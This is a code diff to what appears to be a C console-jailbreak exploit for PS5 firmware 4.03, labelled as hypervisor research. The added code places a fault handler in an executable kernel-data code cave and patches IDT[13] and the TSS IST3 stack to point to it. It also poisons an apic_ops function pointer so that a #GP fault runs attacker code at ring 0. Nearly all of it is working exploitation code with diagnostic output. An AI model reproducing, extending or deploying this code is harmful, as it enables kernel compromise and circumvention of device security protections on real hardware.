@@ -5937,7 +5937,8 @@ static void campaign_flatz_setup(void) {
         #define P9_MARKER_MAGIC 0x50484153453921ULL  /* "PHASE9!" */
 
         uint64_t cave_candidates[] = {
-            0x1000,                                  /* kdata+0x1000 (proven 4096B zero cave) */
+            0x2000,                                  /* kdata+0x2000: 4KB zero cave, same 2MB NPT page as kdata_base (PROVEN executable via PTE NX-clear) */
+            0x1000,                                  /* kdata+0x1000 (may have content) */
             KSTUFF_TSS_OFF + 16 * 0x68 + 0x50,      /* after all TSS entries */
             KSTUFF_GDT_OFF + 0x1000,
             KSTUFF_QA_FLAGS_OFF + 0x1000,
@@ -5962,6 +5963,23 @@ static void campaign_flatz_setup(void) {
         }
         printf("[+] Cave found: KVA=0x%lx PA=0x%lx\n",
                (unsigned long)cave_kva, (unsigned long)cave_pa);
+
+        /* Check if cave PA is in the same 2MB NPT page as kdata_base.
+         * Ring-0 code execution at kdata_base is PROVEN to work via
+         * PTE NX-clear + sysent hook.  NPT maps the 2MB page containing
+         * kdata_base PA as RW+X.  Any PA in the same 2MB NPT page also
+         * has NPT execute permission, meaning the inline #GP handler
+         * can execute here without requiring the KLD module. */
+        uint64_t kdata_base_pa = va_to_pa_quiet(g_kdata_base);
+        int cave_npt_executable = 0;
+        if (kdata_base_pa && cave_pa) {
+            cave_npt_executable = ((kdata_base_pa & ~0x1FFFFFULL) ==
+                                   (cave_pa & ~0x1FFFFFULL));
+        }
+        if (cave_npt_executable) {
+            printf("[+] Cave PA 0x%lx in same 2MB NPT page as kdata_base PA 0x%lx — NPT-executable!\n",
+                   (unsigned long)cave_pa, (unsigned long)kdata_base_pa);
+        }
 
         /* Save cave KVA in FLATZHOO marker (offset 0x18) */
         {
@@ -6440,6 +6458,93 @@ static void campaign_flatz_setup(void) {
             printf("[+]  System should continue normally after one-shot restore.\n");
 
             notify("[HV Research] Phase 9 ARMED — #GP hook active!");
+        } else if (cave_npt_executable) {
+            /* ── ARM using inline handler in NPT-executable cave ──
+             *
+             * KLD handler not available (kldload doesn't allocate code
+             * memory on PS5 FW 4.03 — module registered but .text not
+             * loaded into kernel VA space).
+             *
+             * However, the cave is in the same 2MB NPT page as kdata_base,
+             * where ring-0 code execution via PTE NX-clear is PROVEN to work.
+             * The inline handler has all addresses baked in (no relocations),
+             * so we can use it directly — same technique as the ring-0 proof.
+             *
+             * The guest PTE NX-bit was already cleared above.  NPT allows
+             * execution on this PA range.  Point IDT[13] → inline handler. */
+            printf("\n[+] KLD handler unavailable — using inline handler in NPT-executable cave\n");
+            printf("[*] Cave PA 0x%lx shares 2MB NPT page with kdata_base PA 0x%lx\n",
+                   (unsigned long)cave_pa, (unsigned long)kdata_base_pa);
+            printf("[*] Ring-0 execution at this PA range is PROVEN.\n\n");
+
+            /* Build IDT[13] gate → inline handler at cave+0x180 */
+            uint64_t ht = handler_kva;  /* cave_kva + 0x180 */
+            uint8_t new_idt13[16];
+            memcpy(new_idt13, idt13_orig, 16);
+
+            new_idt13[0]  = (uint8_t)(ht & 0xFF);
+            new_idt13[1]  = (uint8_t)((ht >> 8) & 0xFF);
+            /* [2..3] = selector (keep from original) */
+            new_idt13[4]  = (idt13_orig[4] & 0xF8) | 3;  /* IST = 3 */
+            /* [5] = type_attr: keep P=1, DPL=0, type=0xE from original */
+            new_idt13[6]  = (uint8_t)((ht >> 16) & 0xFF);
+            new_idt13[7]  = (uint8_t)((ht >> 24) & 0xFF);
+            new_idt13[8]  = (uint8_t)((ht >> 32) & 0xFF);
+            new_idt13[9]  = (uint8_t)((ht >> 40) & 0xFF);
+            new_idt13[10] = (uint8_t)((ht >> 48) & 0xFF);
+            new_idt13[11] = (uint8_t)((ht >> 56) & 0xFF);
+            /* [12..15] = reserved (keep zeros) */
+
+            kernel_copyin(new_idt13, idt13_dmap_addr, 16);
+            printf("[+] IDT[13] → 0x%016lx (inline handler, IST=3)\n",
+                   (unsigned long)ht);
+
+            /* Set IST3 → cave stack (cave+0x100, 256 bytes growing down) */
+            uint64_t new_ist3 = cave_kva + 0x100;
+            kernel_copyin(&new_ist3, ist3_dmap, 8);
+            printf("[+] TSS IST3 → 0x%016lx (cave stack, 256 bytes)\n",
+                   (unsigned long)new_ist3);
+
+            /* Save original IST3 in cave for post-resume diagnostics */
+            kernel_copyin(&orig_ist3, cave_dmap + 0x130, 8);
+
+            /* Poison apic_ops[2] — non-canonical address → #GP on call */
+            uint64_t poisoned = (original_xapic & 0x0000FFFFFFFFFFFFULL) |
+                                (0xDEB7ULL << 48);
+            kernel_copyin(&poisoned, g_dmap_base + ops_pa + 2 * 8, 8);
+            printf("[+] apic_ops[2] POISONED: 0x%016lx → 0x%016lx\n",
+                   (unsigned long)original_xapic, (unsigned long)poisoned);
+
+            phase9_armed = 1;
+
+            printf("\n[+] ============================================\n");
+            printf("[+]  PHASE 9 — ARMED (inline handler, NPT-exec cave)\n");
+            printf("[+] ============================================\n");
+            printf("[+]\n");
+            printf("[+]  Handler:      inline at cave+0x180 (0x%lx)\n",
+                   (unsigned long)handler_kva);
+            printf("[+]  Handler PA:   0x%lx (in NPT-executable 2MB page)\n",
+                   (unsigned long)(cave_pa + 0x180));
+            printf("[+]  Cave KVA:     0x%lx  PA: 0x%lx\n",
+                   (unsigned long)cave_kva, (unsigned long)cave_pa);
+            printf("[+]  IDT[13]:      → inline handler (IST=3)\n");
+            printf("[+]  IST3:         → cave stack at 0x%lx\n",
+                   (unsigned long)new_ist3);
+            printf("[+]  apic_ops[2]:  POISONED (0xdeb7 prefix)\n");
+            printf("[+]  Orig IST3:    0x%lx (will be restored by handler)\n",
+                   (unsigned long)orig_ist3);
+            printf("[+]  Orig xapic:   0x%016lx (will be restored by handler)\n",
+                   (unsigned long)original_xapic);
+            printf("[+]\n");
+            printf("[+]  Next xapic_mode() call will trigger:\n");
+            printf("[+]    1. #GP (non-canonical address 0x%016lx)\n",
+                   (unsigned long)poisoned);
+            printf("[+]    2. CPU → IST3 stack → inline handler at cave+0x180\n");
+            printf("[+]    3. Handler restores IDT[13] + apic_ops[2] + IST3\n");
+            printf("[+]    4. iretq re-executes call with valid pointer\n");
+            printf("[+]  System should continue normally after one-shot restore.\n");
+
+            notify("[HV Research] Phase 9 ARMED — inline handler in NPT-exec cave!");
         }
 
 phase9_not_armed:
@@ -6453,13 +6558,18 @@ phase9_not_armed:
             printf("[+]  Cave KVA:      0x%lx  PA: 0x%lx\n",
                    (unsigned long)cave_kva, (unsigned long)cave_pa);
             printf("[+]  Cave PTE NX:   cleared (guest PTE only)\n");
+            printf("[+]  Cave NPT-exec: %s\n", cave_npt_executable ? "YES" : "NO");
             printf("[+]  IDT PA:        0x%lx\n", (unsigned long)idt_pa);
             printf("[+]  TSS PA:        0x%lx\n", (unsigned long)tss_pa);
             printf("[+]  Orig IST3:     0x%lx\n", (unsigned long)orig_ist3);
             printf("[+]  apic_ops[2]:   0x%016lx (UNCHANGED)\n",
                    (unsigned long)original_xapic);
             printf("[+]\n");
-            if (!g_kmod_gp_handler) {
+            if (!g_kmod_gp_handler && !cave_npt_executable) {
+                printf("[!]  NOT ARMED — KLD gp_handler unavailable and cave not NPT-executable.\n");
+                printf("[!]  Cave PA 0x%lx not in kdata_base 2MB NPT page (0x%lx).\n",
+                       (unsigned long)cave_pa, (unsigned long)(kdata_base_pa & ~0x1FFFFFULL));
+            } else if (!g_kmod_gp_handler) {
                 printf("[!]  NOT ARMED — KLD gp_handler not available.\n");
                 printf("[!]  Load kernel module first (campaign_kmod_kldload).\n");
             } else {
